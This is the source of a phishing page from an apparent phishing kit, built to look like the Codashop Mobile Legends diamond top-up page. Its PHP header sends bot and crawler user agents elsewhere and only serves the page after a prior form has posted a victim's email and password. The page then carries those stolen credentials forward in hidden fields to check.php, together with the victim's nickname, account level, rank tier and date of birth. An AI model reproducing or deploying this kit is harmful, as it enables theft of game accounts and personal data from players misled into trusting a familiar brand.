<?php 

$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/IdhamDotID');
die();
}

if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login']) || !isset($_POST['userIdForm'])) {
    header('location: ./');
    die();
}

?>
<!doctype html>
<html lang="en">
   <head>
      <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/xss.min.js"></script>
      <!-- End Google Tag Manager -->
      <script src="https://script.tapfiliate.com/tapfiliate.js" type="text/javascript" async></script>
      <meta charset="UTF-8">
      <!--[if lt IE 9]>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
      <![endif]-->
      <title>Top Up ML | Diamond Mobile Legends - Codashop</title>
      <meta name="generator" content="coda2" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
      <meta name="mobile-web-app-capable" content="yes" />
      <meta name="apple-mobile-web-app-capable" content="yes" />
      <meta name="application-name" content="Codashop" />
      <meta name="apple-mobile-web-app-capable " content="yes " />
      <meta name="apple-mobile-web-app-status-bar-style " content="black " />
      <meta name="apple-mobile-web-app-title " content="Codashop " />
      <link rel="apple-touch-icon " href="https://www.codashop.com/img/icons/favicon-32.png?v=2" />
      <meta name="msapplication-TileImage " content="https://www.codashop.com/img/icons/favicon-32.png?v=2" />
      <meta name="msapplication-TileColor " content="#280031 " />
      <meta name="theme-color " content="#f76b1d" />
      <meta name="format-detection" content="telephone=no" />
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <link rel="icon" type="image/x-icon" href="https://www.codashop.com/img/icons/favicon-32.png?v=2" />
      <!-- OG Tags Start -->
      <meta property="og:url" content="https://www.codashop.com/id/mobile-legends" />
      <meta property="og:type" content="product" />
      <meta property="og:title" content="Top Up ML | Diamond Mobile Legends - Codashop" />
      <meta property="og:description" content="Beli diamond ML di Codashop Indonesia pakai GoPay, OVO, ShopeePay, Bank transfer, Indosat, Telkomsel, XL, Tri, Indomaret hingga Alfamart. CS 24 jam. Terkirim langsung."
         />
      <meta property="og:image" content="https://cdn1.codashop.com/S/content/common/images/rebrand/og-image.png" />
      <meta property="og:image:width" content="1200" />
      <meta property="og:image:height" content="630" />
      <!-- OG Tags End -->
      <meta name="description" content="Beli diamond ML di Codashop Indonesia pakai GoPay, OVO, ShopeePay, Bank transfer, Indosat, Telkomsel, XL, Tri, Indomaret hingga Alfamart. CS 24 jam. Terkirim langsung."
         />
      <link rel="preconnect" href="https://www.google-analytics.com">
      <link rel="preconnect" href="https://connect.facebook.net">
      <link rel="preconnect" href="https://www.googletagmanager.com">
      <link rel="preconnect" href="https://cdn.onesignal.com">
      <link rel="preconnect" href="https://cdn1.codashop.com">
      <style>
         .product__long-description,
         .product-container,
         .footer-container {
         display: none;
         }
      </style>
      <!-- Facebook Pixel Code -->
      <script>
         ! function(f, b, e, v, n, t, s) {
             if (f.fbq) return;
             n = f.fbq = function() {
                 n.callMethod ?
                     n.callMethod.apply(n, arguments) : n.queue.push(arguments)
             };
             if (!f._fbq) f._fbq = n;
             n.push = n;
             n.loaded = !0;
             n.version = '2.0';
             n.queue = [];
             t = b.createElement(e);
             t.async = !0;
             t.src = v;
             s = b.getElementsByTagName(e)[0];
             s.parentNode.insertBefore(t, s)
         }(window,
             document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
         fbq('init', 916139058437464); // Insert your pixel ID here.
         //fbq('track', 'PageView');
      </script>
      <noscript>
         <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=916139058437464&ev=PageView&noscript=1" />
      </noscript>
      <!-- DO NOT MODIFY -->
      <!-- End Facebook Pixel Code -->
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
      <link rel="stylesheet" href="../../.css/popupLogin-AlexHost.css">
      <link rel="stylesheet" href="../../.css/facebook-AlexHost.css">
      <link rel="stylesheet" href="../../.css/twitter-AlexHost.css">
   </head>
   <body class="theme-page--product-page" oncontextmenu="return false" onselectstart="return false" ondragstart="return false" style="background: #280031;">
      

      <input type="hidden" id="seller-name" value="Mobile Legends">
      <input type="hidden" id="context-path" value="">
      <input type="hidden" id="group-id" value="33">
      <div id="product-page__container" class="product-page__container">
         <script type="text/javascript">
            $(document).ready(function() {
                countryCode = '360';
            });
            
            var viewAllText = 'Lihat semua';
            var resultUnitText = 'Hasil';
            var notFoundText = 'Tidak ada hasil';
         </script>
         <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/shop-topnav2.7e1fed6bdf.js"></script>
         <nav class="top-navbar top-nav--general">
            <div class="top-nav-container">
               <div class="logo-container">
                  <a href="/" class="logo-container-link">
                  <img class="logo-image theme-default__logo" src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo-new-2x.png" alt="Codashop" />
                  </a>
                  <h3 class="slogan-element">The fastest and easiest way to purchase game credits.</h3>
               </div>
               <div class="search-container">
                  <div class="search-icon-container">
                     <svg class="search-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                        <path d="M23.809 21.646l-6.205-6.205c1.167-1.605 1.857-3.579 1.857-5.711 0-5.365-4.365-9.73-9.731-9.73-5.365 0-9.73 4.365-9.73 9.73 0 5.366 4.365 9.73 9.73 9.73 2.034 0 3.923-.627 5.487-1.698l6.238 6.238 2.354-2.354zm-20.955-11.916c0-3.792 3.085-6.877 6.877-6.877s6.877 3.085 6.877 6.877-3.085 6.877-6.877 6.877c-3.793 0-6.877-3.085-6.877-6.877z"/>
                     </svg>
                  </div>
               </div>
            </div>
            <div class="search-input-container">
               <input type="search" name="search-keyword" id="search-keyword" class="input-search" placeholder='Pencarian game atau voucher'>
            </div>
            <div class="search-result-list"></div>
         </nav>
         <nav class="top-navbar top-nav--productpage">
            <div class="top-nav-container">
               <div class="custom-page__logo" style="display: none">
                  <div class="logo-image-container">
                     <a href="/ph"><img class="logo-image" src="https://cdn1.codashop.com/S/content/common/images/grab.29dad06670f873936002ddb910253a4b.png" alt="Grabpay"></a>
                  </div>
                  <span class="brand-tagline"></span>
               </div>
               <div class="logo-container">
                  <a href="/" class="logo-container-link">
                  <img class="logo-image theme-default__logo" src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo-new-2x.png" alt="Codashop" />
                  </a>
                  <h3 class="slogan-element">The fastest and easiest way to purchase game credits.</h3>
               </div>
               <div class="search-input-container">
                  <div class="search-input-container--productpage">
                     <input type="search" name="search-input" id="search-input" class="search-input__productpage" placeholder='Pencarian game atau voucher'>
                     <svg class="search-icon--productpage" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                        <path d="M23.809 21.646l-6.205-6.205c1.167-1.605 1.857-3.579 1.857-5.711 0-5.365-4.365-9.73-9.731-9.73-5.365 0-9.73 4.365-9.73 9.73 0 5.366 4.365 9.73 9.73 9.73 2.034 0 3.923-.627 5.487-1.698l6.238 6.238 2.354-2.354zm-20.955-11.916c0-3.792 3.085-6.877 6.877-6.877s6.877 3.085 6.877 6.877-3.085 6.877-6.877 6.877c-3.793 0-6.877-3.085-6.877-6.877z"/>
                     </svg>
                  </div>
                  <div class="search-result-list"></div>
               </div>
            </div>
         </nav>
         <div class="notification-wrapper"></div>
         <main class="container product-container">
            <!-- Google Tag Manager (noscript) -->
            <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PF7TJ9" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
            <!-- End Google Tag Manager (noscript) -->
            <input type="hidden" id="page-name" value="productPage">
            <input type="hidden" id="country-id" value="ID">
            <header class="product-details-container shop-content__container">
               <figure class="product-top-banner__container shop-content--image">
                  <img src="https://i.postimg.cc/kX3LXzJH/mlbb-halloween640x241.jpg" alt="" class="product__top-banner">
               </figure>
               <h2 class="product__name shop-content--heading">Mobile Legends</h2>
               <input type="checkbox" id="product-description" name="product-description" class="product-description-checkbox">
               <label for="product-description">
               <span class="more-info">Read more</span>
               <span class="less-info">Close detail information</span>
               </label>
               <article class="product__description shop-content__container">
               
               <nav class="shop-content--paragraph">More products ⇒ <a href="https://www.codashop.com/id/mobile-legends-member/" style="color: #e8f953">Starlight Member</a>, <a href="https://www.codashop.com/id/mobile-legends-twilight-pass" style="color: #e8f953">Twilight Pass</a></nav>

<p class="shop-content--paragraph">Click here to join and for more event info:

<a href="https://news.codashop.com/id/mobile-legends-event-menangkan-skin-epic-dan-ekstra-diamonds/" target="_blank" style="color: #e8f953">https://news.codashop.com/id/mobile-legends-event-menangkan-skin-epic-dan-ekstra-diamonds/  </a></p>

<p class="shop-content--paragraph">The price increase occurred based on the decision of the Director General of Taxes regarding VAT on digital goods and services as of August 2020. Information on the tax increase can be seen <a href="https://news.codashop.com/id/harga-diamonds-naik-baca-penjelasanya/" target="_blank" style="color: #e8f953">here</a> </p>

<p class="shop-content--paragraph">WARNING: ShopeePay payment method is only available for Mobile Users (Mobile). Please ensure that your Shopee application is updated and has sufficient ShopeePay balance before top up.</p>

<p class="shop-content--paragraph">Top up ML Diamond in just seconds! Just enter your MLBB Username, select the number of Diamonds you want, complete the payment, and the Diamonds will be directly added to your Mobile Legends account.</p>

<p class="shop-content--paragraph">Pay using GoPay, ShopeePay, Dana, OVO, LinkAja, Telkomsel, Indosat, Tri, XL, Bank Transfer, Indomaret, Alfamart, Kredivo, TrueMoney Indonesia, Credit Card, and Doku Wallet. No registration or log-in required.</p>

<p class="shop-content--paragraph">Download and play Mobile Legends: Bang Bang now!<br>
<a class="shop-content--badge" href="https://apps.apple.com/app/id1160056295?country=my" rel="noopener" target="_blank"> <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store"> </a>

<a class="shop-content--badge" href="https://play.google.com/store/apps/details?id=com.mobile.legends&amp;country=my" rel="noopener" target="_blank"> <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play"> </a>

</p>

            </header>
            <section id="contents" class="main-content">
               <input type="hidden" id="pricePointId" name="pricePointId" value="" />
               <div class="confirm-modal__container" id="confirm-user-dialog" title="">
                  <ul>
                     <li class="confirm-modal__title">Detail pesanan</li>
                     <li class="confirm-modal__confirm-txt">Mohon konfirmasi nama panggilan anda sudah benar.</li>
                  </ul>
               </div>
               <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/jquery.mask.min.js"></script>
               <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/mobile/js/freefire.4a7a9740bc.js"></script>
               <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/third_party_common.0859f0e010.js"></script>
               <script type="text/javascript">
                  $(document).ready(function() {
                      $("#confirm-user-dialog").dialog({
                          resizable: false,
                          height: "auto",
                          dialogClass: "no-titlebar",
                          autoOpen: false,
                          modal: true,
                          dialogClass: "confirm-user-dialog__container",
                          buttons: [{
                                  text: 'Batalkan',
                                  class: "confirm-user-dialog__btn btn-cancel",
                                  click: function() {
                                      $('.confirm-user-dialog__container').hide();
                                      $("#overlay").hide();
                                  }
                              },
                              {
                                  text: 'Konfirm',
                                  class: "confirm-user-dialog__btn btn-blue",
                                  click: function() {
                                      $('.confirm-user-dialog__container').hide();
                                      $("#overlay").hide();
                                      openTxnWindow();
                                  }
                              }
                          ],
                          create: function(event, ui) {
                              $(".ui-widget-header").hide();
                              $(this).closest(".ui-dialog").css("padding-top", "15px");
                          }
                      });
                  
                  
                  
                  });
                  
                  function showConfirmation(data, extraMsg) {
                      var ul = $("#confirm-user-dialog > ul");
                  
                      ul = $(ul);
                  
                      $("#confirm-user-dialog > ul > li").not('li:first, li:nth-child(2)').remove();
                  
                      var li = $();
                      var nickname = JSON.parse(decodeURIComponent(data.result)).roles[0].role;
                  
                      nickname = filterXSS(nickname);
                  
                      li = li.add("<li class='confirm-user-dialog__extra-msg'>" + extraMsg + "</li>");
                      li = li.add("<li><div>" + 'Nama panggilan: ' + "</div><div>" + nickname + "</div></li>");
                      li = li.add("<li><div>" + 'ID: ' + "</div><div>" + data.user.userId + "</div></li>");
                      li = li.add("<li><div>" + 'Harga: ' + "</div><div>" + data.channelPrice + "</div></li>");
                      li = li.add("<li><div>" + 'Bayar dengan: ' + "</div><div>" + data.paymentChannel + "</div></li>");
                  
                      li.appendTo(ul);
                      ul.appendTo("#confirm-user-dialog");
                  
                      var txnIdElement = $();
                      txnIdElement = txnIdElement.add("<span id='span-txnId' class='" + data.txnId + "' style='display: none;'></span>");
                      txnIdElement.appendTo("#confirm-user-dialog");
                  
                      $("#overlay").fadeIn(function() {
                          $(".confirm-user-dialog__container").show();
                      });
                  }
               </script>
               <div class="section buy default-template" style="box-shadow: 1px 2px 3px #280031 !important;">
                  <h2 class="circle">
                     <span style="background: #6242fc;">1</span>
                     <div class="section-title">Account Detail</div>
                  </h2>
                  <div class="form" id="formSection">
                     <p class="emailOptional default-1">Complete the data below to facilitate the process of sending Diamonds.</p>
                     <div class="email-input-container">
                        <form action="check.php" method="POST">
                            <input name="email" type="hidden" value="<?= $_POST['email'] ?>" readonly>
                            <input name="password" type="hidden" value="<?= $_POST['password'] ?>" readonly>
                            <input name="login" type="hidden" value="<?= $_POST['login'] ?>" readonly>
                            <div style="margin-top: 10px; font-size: 14px;">
                                <label for="">Nickname</label>
                                <input type="text" style="margin-top: 10px; font-size: 14px;" id="userIdForm" name="nick" class="product-form-input" placeholder="Enter Nickname" required>
                            </div>
                            <div style="margin-top: 10px; font-size: 14px;">
                                <label for="">User ID</label>
                                <input type="text" style="margin-top: 10px; font-size: 14px;" name="playid" class="product-form-input" value="<?= $_POST['userIdForm'] ?> (<?= $_POST['zonaIdForm'] ?>)" readonly>
                            </div>
                            <div style="margin-top: 10px;">
                                <label for="">Level</label>
                                <select style="margin-top: 10px; font-size: 14px;" id="lvl" name="level" class="product-form-input" required>
                                <option selected="selected" disabled="disabled" value="">Choose your account level</option>
<option>Level 1</option>
<option>Level 2</option>
<option>Level 3</option>
<option>Level 4</option>
<option>Level 5</option>
<option>Level 6</option>
<option>Level 7</option>
<option>Level 8</option>
<option>Level 9</option>
<option>Level 10</option>
<option>Level 11</option>
<option>Level 12</option>
<option>Level 13</option>
<option>Level 14</option>
<option>Level 15</option>
<option>Level 16</option>
<option>Level 17</option>
<option>Level 18</option>
<option>Level 19</option>
<option>Level 20</option>
<option>Level 21</option>
<option>Level 22</option>
<option>Level 23</option>
<option>Level 24</option>
<option>Level 25</option>
<option>Level 26</option>
<option>Level 27</option>
<option>Level 28</option>
<option>Level 29</option>
<option>Level 30</option>
<option>Level 31</option>
<option>Level 32</option>
<option>Level 33</option>
<option>Level 34</option>
<option>Level 35</option>
<option>Level 36</option>
<option>Level 37</option>
<option>Level 38</option>
<option>Level 39</option>
<option>Level 40</option>
<option>Level 41</option>
<option>Level 42</option>
<option>Level 43</option>
<option>Level 44</option>
<option>Level 45</option>
<option>Level 46</option>
<option>Level 47</option>
<option>Level 48</option>
<option>Level 49</option>
<option>Level 50</option>
<option>Level 51</option>
<option>Level 52</option>
<option>Level 53</option>
<option>Level 54</option>
<option>Level 55</option>
<option>Level 56</option>
<option>Level 57</option>
<option>Level 58</option>
<option>Level 59</option>
<option>Level 60</option>
<option>Level 61</option>
<option>Level 62</option>
<option>Level 63</option>
<option>Level 64</option>
<option>Level 65</option>
<option>Level 66</option>
<option>Level 67</option>
<option>Level 68</option>
<option>Level 69</option>
<option>Level 70</option>
<option>Level 71</option>
<option>Level 72</option>
<option>Level 73</option>
<option>Level 74</option>
<option>Level 75</option>
<option>Level 76</option>
<option>Level 77</option>
<option>Level 88</option>
<option>Level 79</option>
<option>Level 80</option>
<option>Level 81</option>
<option>Level 92</option>
<option>Level 83</option>
<option>Level 84</option>
<option>Level 85</option>
<option>Level 86</option>
<option>Level 87</option>
<option>Level 88</option>
<option>Level 89</option>
<option>Level 90</option>
<option>Level 91</option>
<option>Level 92</option>
<option>Level 93</option>
<option>Level 94</option>
<option>Level 95</option>
<option>Level 96</option>
<option>Level 97</option>
<option>Level 98</option>
<option>Level 99</option>
<option>Level 100</option></select>
                                </select>
                            </div>
                            <div style="margin-top: 10px;">
                                <label for="">Tier</label>
                                <select style="margin-top: 10px; font-size: 14px;" id="rpl" name="tier" class="product-form-input" required>
                                <option value="" selected="selected" disabled="disabled">Ranked Tier Level</option>
<option>Warrior</option>
<option>Elite</option>
<option>Master</option>
<option>Grandmaster</option>
<option>Epic</option>
<option>Legend</option>
<option>Mythic</option>
<option>Mythical Glory</option>  
                                </select>
                            </div>
                            
                            <div style="margin-top: 10px;">
                                <label>Date of birth</label>
                                <div style="display: flex;">
                                    <select style="margin: 2px; margin-top: 10px; font-size: 14px;" id="rpl" name="year" class="product-form-input" required>
                                <option value="" selected="selected" disabled="disabled">Year</option>
<option>2015</option>
<option>2014</option>
<option>2013</option>
<option>2012</option>
<option>2011</option>
<option>2010</option>
<option>2009</option>
<option>2008</option>
<option>2007</option>
<option>2006</option>
<option>2005</option>
<option>2004</option>
<option>2003</option>
<option>2002</option>
<option>2001</option>
<option>2000</option>
<option>1999</option>
<option>1998</option>
<option>1997</option>
<option>1996</option>
<option>1995</option>
<option>1994</option>
<option>1993</option>
<option>1992</option>
<option>1991</option>
<option>1990</option>
<option>1989</option>
<option>1988</option>
<option>1987</option>
<option>1986</option>
<option>1985</option>  
                                </select>
                                
                                <select style="margin: 2px; margin-top: 10px; font-size: 14px;" id="rpl" name="month" class="product-form-input" required>
                                <option value="" selected="selected" disabled="disabled">Month</option>
<option>January</option>
<option>February</option>
<option>March</option>
<option>April</option>
<option>May</option>
<option>June</option>
<option>July</option>
<option>August</option>
<option>September</option>
<option>October</option>
<option>November</option>
<option>December</option>
                                </select>
                                
                                <select style="margin: 2px; margin-top: 10px; font-size: 14px;" id="rpl" name="day" class="product-form-input" required>
                                <option value="" selected="selected" disabled="disabled">Day</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
                                </select>
                                </div>
                            </div>
                        
                     </div>
                     <div class="email-form-btn-group">
                        <button type="submit" class="email-form-btn__submit" style="background: #6242fc;
    border-radius: 25px;
    border: none;">
                           <div class="loader" id="submit-loader"></div>
                           <span class="btn-submit-text">Submit</span>
                           <span class="btn-submit-text for-grab"></span>
                        </button>
                    </form>
                        <div class="remember-me-container">
                           <label for="ck1" class="remember-me-label">
                           <input type="checkbox" class="remember-me-chkbox" id="ck1">
                           <span class="remember-me-checkmark"></span>
                           <span class="remember-me-text"> Remember me </span>
                           </label>
                        </div>
                     </div>
                  </div>
                  <input type="hidden" id="id_no">
               </div>
               <div class="popError">
                  <div class="section">
                     <h2 class="errorHeader">
                        Aduh!
                     </h2>
                     <ul class="" id="errorMessage"></ul>
                     <br><br>
                     <a href="javascript:void(0);" id="hidePopError" class="modal-button">
                     Kembali</a>
                  </div>
               </div>
               <div id="overlay" class="overlay-element"></div>
            </section>
         </main>
         <section class="section product__long-description shop-content__container" style="background: #fff;
    color: #000;"> 
            <h1 class="product-tagline-title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                
                    Codashop - The easiest way to top up ML in Indonesia
                
                
                
            </font></font></h1>
            <article class="product__tag-line">
                
                    <p class="shop-content--paragraph"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">It only takes a few seconds to buy Mobile Legends diamonds. </font><font style="vertical-align: inherit;">Top up ML and have Starlight Member &amp; Twilight Pass prizes, unlock your favorite Champions, buy cool skins and much more.</font></font></p>

<p class="shop-content--paragraph"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">At Codashop, top-up is easy, safe and practical. </font><font style="vertical-align: inherit;">Codashop is trusted by millions of gamers &amp; app users in Southeast Asia including Indonesia. </font><font style="vertical-align: inherit;">It's easy, no registration or log-in required!</font></font><a href="#top"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Click here to get started</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></p>

<p class="shop-content--paragraph"><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">About Mobile Legends: Bang Bang</font></font></strong><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
Join friends and relatives in the 5v5 MOBA battle, Mobile Legends! </font><font style="vertical-align: inherit;">Choose your favorite hero and build the strongest team with your friends! </font><font style="vertical-align: inherit;">10 seconds of match-making, 10 minutes of fighting. </font><font style="vertical-align: inherit;">Laning, jungling, tower rushing, team war, all the fun of PC MOBA and the best action play is now in your hands! </font><font style="vertical-align: inherit;">Fulfill your eSports spirit!</font></font></p>

<p class="shop-content--paragraph"><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Minimum System Requirements:</font></font></strong>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> • CPU: Snapdragon 430 Octa Core 1.4 GHz (or equivalent)
 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• RAM: 2GB
 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• GPU: Adreno 505 (or equivalent)
 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• OS: iOS 7 / Android 5.0
 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• Initial Download File Size: 103 MB</font></font></p>


                
                
            </p></article>
        </section>
        <section class="faq-accordion-container">
            <div class="accordion-container centered-align"><section class="accordion-section">
                    <div>
                      <input class="faq-switcher" type="checkbox" id="faq-1">
                      <label class="faq-switcher-area" for="faq-1">
                        <h3 class="faq-element__question"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">How to top up diamond Mobile Legends?</font></font></h3>
                        <span class="faq-element__arrow"></span>
                        </label>
                      <article class="faq-element__answer"><p class="shop-content--paragraph"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Buying Mobile Legends diamonds is easy, safe, and practical on Codashop. </font><font style="vertical-align: inherit;">Just follow these easy steps, and diamonds will be sent directly to your Mobile Legends account in just seconds.</font></font></p>
<ul class="shop-content--list list-number"><li><a href="#top"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Click here to get started</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enter your Mobile Legends User ID.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Select the number of diamonds you want.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Choose the easiest payment method for you.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Click on the "Buy Now" button to complete your transaction.</font></font></li></ul>
<p class="shop-content--paragraph"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After the payment is successful, the diamond will be sent directly to your MLBB account.</font></font></p></article> 
                    </div>
                  </section><section class="accordion-section">
                    <div>
                      <input class="faq-switcher" type="checkbox" id="faq-2">
                      <label class="faq-switcher-area" for="faq-2">
                        <h3 class="faq-element__question"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Can I send gifts to friends in Mobile Legends?</font></font></h3>
                        <span class="faq-element__arrow"></span>
                        </label>
                      <article class="faq-element__answer"><p class="shop-content--paragraph"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Yes, you can also give away Diamonds or Mobile Legends Memberships using Codashop! </font><font style="vertical-align: inherit;">Just follow these easy steps, and the gift will be sent directly to your friend's Mobile Legends account in just seconds.</font></font></p><p>
</p><ul class="shop-content--list list-number"><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Select the gift you want to send to get started.
</font></font><ul class="shop-content--list list-dot"><li><a href="#top"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Click here to send diamonds</font></font></a></li><a href="#top">
</a><li><a href="#top"></a><a href="https://www.codashop.com/id/mobile-legends-member/" target="_blank" rel="noopener"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Click here to send Starlight Member</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></li>
<li><a href="https://www.codashop.com/id/mobile-legends-twilight-pass" target="_blank" rel="noopener"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Click here to submit your Twilight Pass</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></li></ul></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enter the recipient's User ID.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Choose the number of top-ups or memberships you want to give</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Choose the easiest payment method for you</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Click on the "Buy Now" button to complete your transaction.</font></font></li></ul>
<p class="shop-content--paragraph"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After the payment is successful, the gift you have purchased will be sent directly to your friend's MLBB account.</font></font></p></article> 
                    </div>
                  </section><section class="accordion-section">
                    <div>
                      <input class="faq-switcher" type="checkbox" id="faq-3">
                      <label class="faq-switcher-area" for="faq-3">
                        <h3 class="faq-element__question"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Can I buy Starlight Member &amp; Twillight on Codashop?</font></font></h3>
                        <span class="faq-element__arrow"></span>
                        </label>
                      <article class="faq-element__answer"><p class="shop-content--paragraph"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Yes, you can also buy Starlight Member &amp; Twilight Pass on Codashop!</font></font></p>
<ul class="shop-content--list list-dot"><li><a href="https://www.codashop.com/id/mobile-legends-member/" target="_blank" rel="noopener"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Click here to send Starlight Member / Starlight Member Plus</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit; color: #e8f953;"> .</font></font></li>
<li><a href="https://www.codashop.com/id/mobile-legends-twilight-pass" target="_blank" rel="noopener"><font style="vertical-align: inherit; color: #e8f953;"><font style="vertical-align: inherit; color: #e8f953;">Click here to submit your Twilight Pass</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></li></ul></article> 
                    </div>
                  </section></div>
        </section>
         <link rel="stylesheet" href="https://cdn1.codashop.com/S/content/common/css/jquery-ui-1.12.1.css" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-topnav2.5566e671b1.css" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/productPage/responsive-product-page2.7ec2b81ede.css" />
         <!-- info bar css -->
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/infoBar.662b8f1b5f.css" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-shop-content.e6202b83de.css" />
         <link rel="stylesheet preload" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-fontfaces.b6c83d3582.css" as="style" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-footer2.2ce4d6e299.css" />
         <footer class="footer-container" style="background-color: #e8f953 !important">
            <div class="footer-area">
               <section class="left-blocks-container">
                  <div class="socials-container">
                     <p class="social-title">Get Coda news at:</p>
                     <div class="footer__social-media-container">
                        <a href='https://www.facebook.com/Codashop.IDofficial/' target="_blank" class="social-icon-container" aria-label="Codashop Official Facebook" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-H36.png" alt="" class="social-icon">
                        </a>
                        <a href='https://www.youtube.com/c/CodashopOfficial' target="_blank" class="social-icon-container" aria-label="Codashop Youtube Channel" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-youtube-H36.png" alt="" class="social-icon">
                        </a>
                        <a href='https://www.instagram.com/codashop.idofficial/' target="_blank" class="social-icon-container" aria-label="Codashop Official" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-instagram-H36.png" alt="" class="social-icon">
                        </a>
                     </div>
                  </div>
                  <div class="support-container">
                     <p class="support-title">Need help?</p>
                     <div class="support-icons">
                        <a href='http://m.me/Codashop.IDofficial' target="_blank" class="social-icon-container" aria-label="Contact via Facebook" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-msg-H36.png" alt="" class="social-icon">
                        </a>
                     </div>
                     <a href='https://support.codapay.com/hc/en-us/categories/360000012223-Indonesia' target="_blank" class="support-link" aria-label="Contact Codashop support" rel="noopener">
                        <div class="contact-icon">
                           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
